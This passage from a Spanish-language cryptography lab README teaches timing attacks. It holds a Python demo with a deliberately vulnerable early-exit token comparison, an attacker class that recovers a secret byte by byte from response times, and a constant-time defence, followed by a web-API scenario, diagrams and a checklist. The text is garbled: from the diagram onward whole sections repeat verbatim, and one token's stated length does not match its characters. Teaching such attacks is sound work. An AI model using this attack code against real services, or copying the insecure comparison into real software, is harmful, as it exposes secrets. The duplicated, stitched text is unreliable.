**Mitigaciones**:
- Retpoline (software: rewrite de branches)
- IBRS (hardware: Indirect Branch Restricted Speculation)
- KPTI (Kernel Page Table Isolation)
- Actualización de microcódigo

---

### 💻 DEMOSTRACIÓN PRÁCTICA

```python
#!/usr/bin/env python3
"""
Timing Attack: Demostración educativa

Muestra:
1. Por qué comparaciones tempranas son vulnerables
2. Cómo medir diferencias de microsegundos
3. Cómo constant-time comparison previene el ataque
"""

import time
import hmac
import secrets
import statistics
from collections import defaultdict

class VulnerableAuth:
    """
    Sistema de autenticación VULNERABLE a timing attacks
    """

    def __init__(self, secret_token):
        self.secret_token = secret_token

    def verify_insecure(self, provided_token):
        """
        Comparación INSEGURA: Sale temprano cuando encuentra diferencia

        Esta es la vulnerabilidad que permite timing attacks.
        """
        if len(self.secret_token) != len(provided_token):
            return False

        # Comparación byte por byte (sale temprano)
        for i in range(len(self.secret_token)):
            if self.secret_token[i] != provided_token[i]:
                return False  # ← VULNERABILIDAD: Sale inmediatamente

        return True

    def verify_secure(self, provided_token):
        """
        Comparación SEGURA: Tiempo constante usando hmac.compare_digest
        """
        return hmac.compare_digest(self.secret_token, provided_token)

class TimingAttacker:
    """
    Atacante que explota timing para deducir el token secreto
    """

    def __init__(self, target_function, token_length):
        """
        Args:
            target_function: Función a atacar (debe retornar bool)
            token_length: Longitud del token en bytes
        """
        self.target = target_function
        self.token_length = token_length
        self.measurements = defaultdict(list)

    def measure_timing(self, guess, samples=1000):
        """
        Mide el tiempo promedio de verificar un guess

        Args:
            guess: Token candidato a probar
            samples: Número de mediciones (más = más preciso)

        Returns:
            float: Tiempo promedio en nanosegundos
        """
        timings = []

        for _ in range(samples):
            start = time.perf_counter_ns()
            self.target(guess)
            end = time.perf_counter_ns()
            timings.append(end - start)

        # Usar mediana en lugar de promedio (más robusto a outliers)
        return statistics.median(timings)

    def attack_byte_by_byte(self, known_prefix=b'', samples_per_guess=100):
        """
        Ataque byte por byte usando timing

        Args:
            known_prefix: Bytes ya conocidos
            samples_per_guess: Muestras por cada guess

        Returns:
            bytes: Token completo recuperado
        """
        recovered = bytearray(known_prefix)

        print(f"\n[+] Iniciando timing attack...")
        print(f"    Longitud objetivo: {self.token_length} bytes")
        print(f"    Muestras por guess: {samples_per_guess}")
        print(f"    Bytes iniciales conocidos: {len(known_prefix)}")

        # Recuperar cada byte
        for position in range(len(known_prefix), self.token_length):
            print(f"\n[*] Recuperando byte {position + 1}/{self.token_length}:")

            best_guess = None
            best_time = 0
            timings_distribution = {}

            # Probar todos los valores posibles (0x00 a 0xFF)
            for byte_value in range(256):
                # Construir guess: known bytes + current guess + padding
                guess = bytes(recovered + bytes([byte_value]))
                guess += b'\x00' * (self.token_length - len(guess))

                # Medir timing
                avg_time = self.measure_timing(guess, samples_per_guess)
                timings_distribution[byte_value] = avg_time

                # El byte correcto debería tomar MÁS tiempo
                if avg_time > best_time:
                    best_time = avg_time
                    best_guess = byte_value

                # Progress bar
                if byte_value % 16 == 0:
                    pct = (byte_value / 256) * 100
                    print(f"    Progreso: {pct:.0f}%", end='\r', flush=True)

            # Mostrar top 5 candidatos
            top_5 = sorted(timings_distribution.items(),
                          key=lambda x: x[1], reverse=True)[:5]

            print(f"\n    Top 5 candidatos (por timing):")
            for rank, (byte_val, timing) in enumerate(top_5, 1):
                char = chr(byte_val) if 32 <= byte_val < 127 else '?'
                print(f"      #{rank}: 0x{byte_val:02x} ('{char}') → {timing:,} ns")

            # Agregar el mejor guess
            recovered.append(best_guess)
            current_str = recovered.decode('ascii', errors='replace')
            print(f"    [✓] Byte encontrado: 0x{best_guess:02x}")
            print(f"    [✓] Token parcial: {current_str}")

        return bytes(recovered)

    def statistical_analysis(self, correct_token):
        """
        Análisis estadístico de las diferencias de timing
        """
        print(f"\n{'='*70}")
        print(f"ANÁLISIS ESTADÍSTICO DE TIMING")
        print(f"{'='*70}")

        samples = 10000

        # Caso 1: 0 bytes correctos
        wrong_guess = b'\x00' * self.token_length
        time_0_bytes = self.measure_timing(wrong_guess, samples)

        # Caso 2: 1 byte correcto
        guess_1_byte = correct_token[:1] + b'\x00' * (self.token_length - 1)
        time_1_byte = self.measure_timing(guess_1_byte, samples)

        # Caso 3: Mitad correcta
        half = self.token_length // 2
        guess_half = correct_token[:half] + b'\x00' * (self.token_length - half)
        time_half = self.measure_timing(guess_half, samples)

        # Caso 4: Todo correcto
        time_all = self.measure_timing(correct_token, samples)

        print(f"\nTiempos promedio ({samples} muestras):")
        print(f"  0 bytes correctos:    {time_0_bytes:>10,} ns")
        print(f"  1 byte correcto:      {time_1_byte:>10,} ns  (Δ = +{time_1_byte - time_0_bytes:>6,} ns)")
        print(f"  {half} bytes correctos:  {time_half:>10,} ns  (Δ = +{time_half - time_0_bytes:>6,} ns)")
        print(f"  {self.token_length} bytes correctos: {time_all:>10,} ns  (Δ = +{time_all - time_0_bytes:>6,} ns)")

        # Calcular diferencia por byte
        delta_per_byte = (time_all - time_0_bytes) / self.token_length
        print(f"\nDiferencia promedio por byte: {delta_per_byte:,.1f} ns")
        print(f"Detectable en hardware moderno: {'SÍ' if delta_per_byte > 1 else 'DIFÍCIL'}")

def demo_vulnerability():
    """
    Demostración completa de timing attack
    """
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║              TIMING ATTACK - DEMOSTRACIÓN EDUCATIVA              ║
║                                                                   ║
║  Este script demuestra cómo un atacante puede extraer un token   ║
║  secreto midiendo tiempos de respuesta.                          ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

    # Generar token secreto aleatorio
    token_length = 16  # 16 bytes = 128 bits
    secret_token = secrets.token_bytes(token_length)

    print(f"[*] Sistema generó token secreto:")
    print(f"    Hex: {secret_token.hex()}")
    print(f"    Longitud: {token_length} bytes ({token_length * 8} bits)")
    print(f"\n[!] Atacante NO conoce este token")
    print(f"[!] Atacante solo puede medir tiempos de respuesta\n")

    # Crear sistema vulnerable
    auth_system = VulnerableAuth(secret_token)

    # Análisis estadístico inicial
    attacker = TimingAttacker(auth_system.verify_insecure, token_length)
    attacker.statistical_analysis(secret_token)

    input("\n[Presiona ENTER para iniciar el ataque...]")

    # Ejecutar ataque
    start_attack = time.time()
    recovered_token = attacker.attack_byte_by_byte(samples_per_guess=500)
    attack_duration = time.time() - start_attack

    # Verificar resultado
    print(f"\n{'='*70}")
    print(f"RESULTADO DEL ATAQUE")
    print(f"{'='*70}")
    print(f"Token original:   {secret_token.hex()}")
    print(f"Token recuperado: {recovered_token.hex()}")
    print(f"¿Coincide? {secret_token == recovered_token}")
    print(f"\nTiempo total del ataque: {attack_duration:.1f} segundos")
    print(f"Promedio por byte: {attack_duration / token_length:.2f} segundos")

    # Calcular complejidad vs brute force
    brute_force_attempts = 256 ** token_length
    timing_attack_attempts = 256 * token_length
    speedup = brute_force_attempts / timing_attack_attempts

    print(f"\n[+] Comparación con brute force:")
    print(f"    Brute force: 256^{token_length} = {brute_force_attempts:.2e} intentos")
    print(f"    Timing attack: 256 × {token_length} = {timing_attack_attempts} intentos")
    print(f"    Speedup: {speedup:.2e}x más rápido!")

def demo_defense():
    """
    Demostración de defensa con constant-time comparison
    """
    print("""

╔═══════════════════════════════════════════════════════════════════╗
║  DEFENSA: Constant-Time Comparison                               ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

    token_length = 16
    secret_token = secrets.token_bytes(token_length)

    print(f"[*] Mismo token secreto: {secret_token.hex()}")

    # Sistema seguro
    auth_system = VulnerableAuth(secret_token)

    print(f"\n[*] Midiendo tiempos con CONSTANT-TIME comparison:")

    samples = 10000

    # Medir con diferentes números de bytes correctos
    timings = {}

    for correct_bytes in [0, 1, token_length // 2, token_length]:
        guess = secret_token[:correct_bytes] + b'\x00' * (token_length - correct_bytes)

        times = []
        for _ in range(samples):
            start = time.perf_counter_ns()
            auth_system.verify_secure(guess)  # ← Función segura
            end = time.perf_counter_ns()
            times.append(end - start)

        median_time = statistics.median(times)
        timings[correct_bytes] = median_time

        print(f"    {correct_bytes:2d} bytes correctos: {median_time:>10,} ns")

    # Analizar diferencias
    time_0 = timings[0]
    max_delta = max(abs(t - time_0) for t in timings.values())

    print(f"\n[✓] Diferencia máxima: {max_delta:,} ns")
    print(f"[✓] Diferencia relativa: {(max_delta / time_0) * 100:.4f}%")

    if max_delta < 100:  # < 100 ns de variación
        print(f"[✓] SEGURO: Diferencias son ruido estadístico")
        print(f"[✓] Timing attack NO es práctico")
    else:
        print(f"[!] ADVERTENCIA: Aún hay variación detectable")

    print(f"\n[*] Conclusión:")
    print(f"    hmac.compare_digest() implementa comparación de tiempo constante")
    print(f"    mediante una operación XOR bit a bit que siempre procesa todos los bytes:")

    print("""
    # Implementación interna (simplificada):
    def compare_digest(a, b):
        if len(a) != len(b):
            return False

        result = 0
        for x, y in zip(a, b):
            result |= x ^ y  # ← XOR siempre ejecuta, no sale temprano

        return result == 0  # ← Retorna solo al final
    """)

def demo_real_world_attack():
    """
    Simulación de timing attack en contexto real (API web)
    """
    print("""

╔═══════════════════════════════════════════════════════════════════╗
║  ESCENARIO REAL: API Web con Token de Autenticación             ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

    print("""
Contexto:
  - API REST en /api/secret
  - Autenticación con Bearer token en header
  - Token: 32 bytes hex (256 bits)
  - Código vulnerable:

    def verify_token(received):
        expected = get_token_from_db()
        if received == expected:  # ← Vulnerable!
            return True
        return False

Ataque:
  1. Atacante envía 256 requests con diferentes primeros bytes
  2. Mide tiempo de respuesta de cada request
  3. El byte correcto tarda +10 μs más
  4. Repite para cada byte (32 iteraciones)

Total de requests: 256 × 32 = 8,192 requests
Tiempo estimado: ~10 minutos (con rate limiting)

Vs. Brute force:
  - Intentos: 2^256 ≈ 10^77 (imposible)
  - Timing attack: 8,192 intentos (¡trivial!)
    """)

    print("[*] Mitigation en producción:")
    print("""
1. Usar constant-time comparison (hmac.compare_digest)
2. Agregar random delay (dificulta timing)
3. Rate limiting agresivo (< 10 req/min por IP)
4. Monitoring de patrones de requests sospechosos
5. Considerar tokens únicos por sesión (dificulta múltiples intentos)
    """)

# Ejecutar demos
if __name__ == "__main__":
    # Demo 1: Timing attack básico
    demo_vulnerability()

    input("\n[Presiona ENTER para ver la defensa...]")
    demo_defense()

    input("\n[Presiona ENTER para ver escenario real...]")
    demo_real_world_attack()

    print("""

╔═══════════════════════════════════════════════════════════════════╗
║  LECCIONES CLAVE                                                  ║
╚═══════════════════════════════════════════════════════════════════╝

1. NUNCA usar == para comparar secretos (passwords, tokens, HMACs)
2. SIEMPRE usar hmac.compare_digest() o equivalente
3. Timing attacks son prácticos incluso remotamente
4. Diferencias de microsegundos son detectables con suficientes muestras
5. La defensa es simple pero DEBE aplicarse consistentemente

Checklist de código:
  ✓ ¿Comparas passwords/tokens?       → hmac.compare_digest()
  ✓ ¿Verificas HMACs/signatures?      → hmac.compare_digest()
  ✓ ¿Implementas rate limiting?       → <10 requests/min
  ✓ ¿Monitoras patrones sospechosos?  → Alertas automáticas
    """)
```

### 📊 DIAGRAMA DE TIMING ATTACK

```
VISUALIZACIÓN DE TIMING LEAK
════════════════════════════════════════════════════════════════════

Token secreto: "S3cR3tT0k3n!"  (13 bytes)

Comparación VULNERABLE (sale temprano):
┌──────────────────────────────────────────────────────────────────┐
│  Guess:  "A????????????"  →  Falla en posición 0                │
│  Tiempo: ████ (100.000 ns - base time)                          │
│                                                                   │
│  Guess:  "S????????????"  →  Falla en posición 1                │
│  Tiempo: █████ (100.010 ns - comparó 1 byte extra)              │
│                                                                   │
│  Guess:  "S3???????????"  →  Falla en posición 2                │
│  Tiempo: ██████ (100.020 ns - comparó 2 bytes)                  │
│                                                                   │
│  ...                                                             │
│                                                                   │
│  Guess:  "S3cR3tT0k3n!"  →  ¡MATCH completo!                    │
│  Tiempo: █████████████ (100.130 ns - comparó todos los bytes)   │
└──────────────────────────────────────────────────────────────────┘

Comparación SEGURA (tiempo constante):
┌──────────────────────────────────────────────────────────────────┐
│  Guess:  "A????????????"  →  NO match                           │
│  Tiempo: ████████ (150.000 ns - procesa TODOS los bytes)        │
│                                                                   │
│  Guess:  "S????????????"  →  NO match                           │
│  Tiempo: ████████ (150.000 ns - mismo tiempo!)                  │
│                                                                   │
│  Guess:  "S3???????????"  →  NO match                           │
│  Tiempo: ████████ (150.000 ns - mismo tiempo!)                  │
│                                                                   │
│  Guess:  "S3cR3tT0k3n!"  →  MATCH                               │
│  Tiempo: ████████ (150.000 ns - mismo tiempo!)                  │
│                                                                   │
│  ✓ NO hay diferencia detectable → Timing attack IMPOSIBLE       │
└──────────────────────────────────────────────────────────────────┘
```

### ⚠️ MITIGACIÓN

Usar `hmac.compare_digest()` o equivalentes constant-time en todos los lenguajes.

### 📋 CHECKLIST

- [ ] Nunca usar `==` para comparar secretos
- [ ] Siempre usar comparación constant-time
- [ ] Implementar rate limiting
- [ ] Agregar delay aleatorio

### 📚 REFERENCIAS

1. **Kocher, P. C.** (1996): *Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS, and Other Systems*. CRYPTO 1996.
2. **Brumley, D. & Boneh, D.** (2003): *Remote Timing Attacks are Practical*. USENIX Security 2003.
3. **CVE-2003-0147**: OpenSSL Timing Attack.

---

## Comparativa de Ataques

| Ataque | Complejidad | Impacto | Mitigación |
|--------|-------------|---------|------------|
| ECB | Baja | Medio | Usar GCM/CBC |
| Padding Oracle | Media | Alto | Usar AEAD |
| Rainbow Tables | Baja | Alto | Salt + Argon2 |
| Timing | Alta | Alto | Constant-time |

---

## Entregables

1. ECB Penguin con screenshots
2. Padding Oracle descifrado exitoso
3. Rainbow table cracking
4. Timing attack recuperación de token

---

[⬅️ Anterior](../lab_03_ecc/) | [🏠 Volver](../../README.md)
│                                                                   │
│  Guess:  "S3???????????"  →  Falla en posición 2                │
│  Tiempo: ██████ (100.020 ns - comparó 2 bytes)                  │
│                                                                   │
│  ...                                                             │
│                                                                   │
│  Guess:  "S3cR3tT0k3n!"  →  ¡MATCH completo!                    │
│  Tiempo: █████████████ (100.130 ns - comparó todos los bytes)   │
└──────────────────────────────────────────────────────────────────┘

Comparación SEGURA (tiempo constante):
┌──────────────────────────────────────────────────────────────────┐
│  Guess:  "A????????????"  →  NO match                           │
│  Tiempo: ████████ (150.000 ns - procesa TODOS los bytes)        │
│                                                                   │
│  Guess:  "S????????????"  →  NO match                           │
│  Tiempo: ████████ (150.000 ns - mismo tiempo!)                  │
│                                                                   │
│  Guess:  "S3???????????"  →  NO match                           │
│  Tiempo: ████████ (150.000 ns - mismo tiempo!)                  │
│                                                                   │
│  Guess:  "S3cR3tT0k3n!"  →  MATCH                               │
│  Tiempo: ████████ (150.000 ns - mismo tiempo!)                  │
│                                                                   │
│  ✓ NO hay diferencia detectable → Timing attack IMPOSIBLE       │
└──────────────────────────────────────────────────────────────────┘
```

### ⚠️ MITIGACIÓN

Usar `hmac.compare_digest()` o equivalentes constant-time en todos los lenguajes.

### 📋 CHECKLIST

- [ ] Nunca usar `==` para comparar secretos
- [ ] Siempre usar comparación constant-time
- [ ] Implementar rate limiting
- [ ] Agregar delay aleatorio

### 📚 REFERENCIAS

1. **Kocher, P. C.** (1996): *Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS, and Other Systems*. CRYPTO 1996.
2. **Brumley, D. & Boneh, D.** (2003): *Remote Timing Attacks are Practical*. USENIX Security 2003.
3. **CVE-2003-0147**: OpenSSL Timing Attack.

---

## Comparativa de Ataques

| Ataque | Complejidad | Impacto | Mitigación |
|--------|-------------|---------|------------|
| ECB | Baja | Medio | Usar GCM/CBC |
| Padding Oracle | Media | Alto | Usar AEAD |
| Rainbow Tables | Baja | Alto | Salt + Argon2 |
| Timing | Alta | Alto | Constant-time |

---

## Entregables

1. ECB Penguin con screenshots
2. Padding Oracle descifrado exitoso
3. Rainbow table cracking
4. Timing attack recuperación de token

---

[⬅️ Anterior](../lab_03_ecc/) | [🏠 Volver](../../README.md)
